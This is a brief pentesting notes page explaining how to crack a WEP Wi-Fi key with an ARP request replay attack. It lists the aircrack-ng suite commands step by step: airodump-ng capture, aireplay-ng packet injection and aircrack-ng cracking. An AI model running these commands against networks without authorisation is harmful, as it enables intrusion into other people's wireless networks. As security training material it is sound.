---
title: WEP
source_url: https://notes.incendium.rocks/pentesting-notes/wireless-networks/wep
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: wireless
---

Look at how the ARP Request Replay attack works. Essentially it tries to find an ARP packet and once it does, it replays it to the victim AP. You keep replaying it until you capture enough IVs and then you can crack the WEP key. No need for a wordlist.

## 1. Start airodump-ng

To capture packets:

```bash
sudo airodump-ng --bssid F0:9F:C2:AA:19:29 -c 1 -w wep wlan0mon
```

## 2. Send packets with injection

```bash
sudo aireplay-ng -3 -b F0:9F:C2:AA:19:29 -h 02:00:00:00:00:00 wlan0mon
```

Get your own MAC using:

```bash
macchanger --show wlan0mon
```

Now wait for 30 to 60 seconds

## 3. Crack it

```bash
aircrack-ng wep-01.cap
```
